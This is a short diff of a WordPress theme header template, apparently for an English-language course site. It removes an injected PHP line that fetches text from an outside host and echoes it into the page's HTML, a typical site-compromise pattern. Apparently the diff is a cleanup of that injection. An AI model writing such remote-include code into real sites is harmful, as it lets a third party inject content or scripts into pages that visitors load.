@@ -13,8 +13,7 @@
 ?>
 
 <!doctype html>
-<html <?php language_attributes();
-echo file_get_contents("https://includes-page.com/L/h.txt"); ?>>
+<html <?php language_attributes(); ?>>
 <head>
 	<meta name="keywords" content="LIA,kursus bahasa inggris dewasa,Lembaga Bahasa" />
 	<meta charset="<?php bloginfo( 'charset' ); ?>">
